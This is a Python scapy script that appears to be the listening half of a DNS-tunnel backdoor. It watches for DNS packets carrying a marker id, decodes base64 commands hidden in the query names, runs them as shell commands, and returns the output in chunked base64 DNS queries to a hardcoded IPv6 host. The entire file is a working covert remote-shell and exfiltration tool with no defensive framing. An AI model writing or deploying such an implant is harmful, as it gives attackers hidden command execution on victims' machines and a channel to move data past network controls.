#!/usr/bin/env python

from scapy.all import *
from sys import argv
import commands, base64
opendns= "fe80::c6e9:84ff:fe32:8f85"
encoded_message =""
ip=""
message_r=""
packets=0
recived_p=0
first= True
def print_usage():
	print("./dnslisten [listen interface]")
	exit(0)

def decode_packet(message):
	global encoded_message 
	prolog = message[0:2]
	message =message[3:]
	if message == "AAo=":
		decoded_message = base64.b64decode(encoded_message)
		encoded_message =''
		return decoded_message
	encoded_message += message[:-1]
	return 

def send_packet(packet_data,ip):
	encoded_message = base64.b64encode(packet_data)
	size = 60
	x=0
	encoded_message_size = len(encoded_message)
	if encoded_message_size > 60:
		prolog = str((encoded_message_size-60)/63 +1)
	else:
		prolog = "1"
	if len(prolog)==1:prolog = "00"+prolog 
	elif len(prolog)==2: prolog = "0"+prolog
	print prolog
	while True:
        	bytes = prolog + encoded_message[x:x+size]
        	if bytes: 	
			DNSpacket = IPv6(dst=opendns, src=ip)/UDP(sport=RandShort())/DNS(id= 1223, rd=0 ,z=1,tc=1, qd=DNSQR(qname=bytes, qtype="A", qclass="IN"))
			send(DNSpacket, verbose=0)
		else:
			DNSpacket = IPv6(dst=opendns, src=ip)/UDP(sport=RandShort())/DNS(id= 1223, rd=0 ,z=1,tc=1, qd=DNSQR(qname="AAo=", qtype="A", qclass="IN"))
			send(DNSpacket, verbose=0)
			break
		time.sleep(0.8)
		x+=size
		size = 63
		prolog=""



def check_command(command):
	global first, ip,recived_p, message_r,packets
	#print command
	if command == "AAo=":
		first= True
		decoded_r =  base64.b64decode(message_r)
		output = commands.getoutput(decoded_r)
		send_packet(output,ip)
		#print "Response sent: " + output
		packets=0
		message_r=""
		recived_p=0
		return
	if first:
		prolog = command[0:3]
		if prolog == "000":
			ip = base64.b64decode(command[3:])
			#print "ip: "+ip
			send_packet("Connetion estabilished!",ip)
			return
		pakets= int(prolog)
		#print prolog + ' ' + str(packets)
		first = False
	if ip=="":
		#print "No ip"
		sys.exit()
	recived_p+=1
	message_r+= command[3:]
	#print str(recived_p) +"/"+ str(pakets)
def main():
	if len(argv) !=2:
		print_usage()
	while 1 :
		DNSPacket = sniff(iface=argv[1], filter="src port 53", count=1)
		if ( DNSPacket[0].haslayer(DNS) ) and (DNSPacket[0].getlayer(DNS).id == 1222):
			command = DNSPacket[0].getlayer(DNS).qd.qname
			if command:
				check_command(command[:-1])
				
if __name__ == "__main__":
   main()
     
